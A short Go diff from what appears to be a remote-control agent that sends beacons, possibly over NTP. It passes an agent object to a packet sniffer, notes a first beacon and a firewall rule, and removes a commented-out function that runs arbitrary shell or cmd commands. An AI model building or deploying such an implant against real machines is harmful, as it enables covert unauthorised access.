@@ -34,11 +34,11 @@ func main() {
 
 	//start listening, goroutine handler for concurrent traffic 
 	 //program runs until break
-	handler.StartSniffer(newAgent.IFace, newAgent.MyIP)
+	handler.StartSniffer(newAgent)
 			
 }
 
-//Setup - sets up NTP configurations based on OS, add firewall rule every 5?
+//Setup - sets up NTP configurations based on OS, sends out first beacon, add firewall rule every 5?
 func Setup(newAgent agent.Agent) { 
 	var commandList []string
 	if newAgent.OpSys == "Windows" {
@@ -61,27 +61,6 @@ func Setup(newAgent agent.Agent) {
 }
 
 /*
-
-func runCMD(command string, agent Agent) {
-	var startType string
-	var flag string
-
-	if agent.OpSys == "windows"{
-		startType = "cmd"
-		flag = "/c"
-	} else {
-		startType = "/bin/sh"
-		flag = "-c"
-	}
-
-	output, err := exec.Command(startType, flag, command).Output()
-	if err != nil{
-		fmt.Println("couldn't run command")
-	}
-
-	fmt.Println(string(output))
-}
-
 
 
 raw sockets
